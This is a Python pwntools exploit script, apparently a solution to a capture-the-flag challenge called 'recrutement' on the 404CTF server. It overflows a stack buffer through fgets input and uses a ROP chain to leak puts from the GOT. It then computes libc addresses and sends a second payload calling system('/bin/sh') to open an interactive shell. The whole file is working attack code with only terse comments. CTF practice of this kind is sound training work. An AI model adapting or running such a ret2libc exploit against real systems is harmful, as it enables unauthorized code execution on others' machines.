#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "challenge.404ctf.fr"
PORT = 30690

exe = ELF("./recrutement")

libc = ELF("./libc-2.27.so")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path])

    return r


def main():
    global r

    pop_rdi = 0x400763 # pop rdi ; ret
    puts_plt = 0x400520
    puts_got = 0x601018
    main = 0x400647
    ret = 0x400506

    sys_libc = 0x4f420
    puts_libc = 0x80970
    bin_sh_libc = 0x1b3d88

    payload = b""
    payload += b"scientifique"
    payload += b"A" * (0x32 - 12  - 1) #fill first fgets

    payload += b"B" * 0x38
    payload += p64(0) #adresse stack
    payload += p64(0) #p64(0x400700) # saved rbp
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)
    payload += b"B"  * (0x78 - 0x38 - (6 * 8)  - 3) #fill second fgets

    r = conn()

    r.recvuntil(b'profession :\n')
    r.send(payload + NL)

    rep = r.recv()
    leak = rep.split(b"\n")[2].strip().ljust(8,b'\x00')
    log.success("Leak : " + hex(u64(leak)))

    print(rep)

    offset = u64(leak) - puts_libc
    sys = offset + sys_libc
    bin_sh = offset + bin_sh_libc

    log.success("Offset : " + hex(offset))
    log.success("Sys : " + hex(sys))
    log.success("/bin/sh : " + hex(bin_sh))

    payload2 = b"scientifique"
    payload2 += b"A" * (0x32 - 12 - 1) #fill third fgets

    payload2 += b"B" * 0x38
    payload2 += p64(0)
    payload2 += p64(0)
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh)
    payload2 += p64(ret)  # simple ret for stack alignement
    payload2 += p64(sys)
    payload2 += b"B" * (0x78 - 0x38 - (6*8) )

    r.send(payload2 + NL)
    r.interactive()

if __name__ == "__main__":
    main()
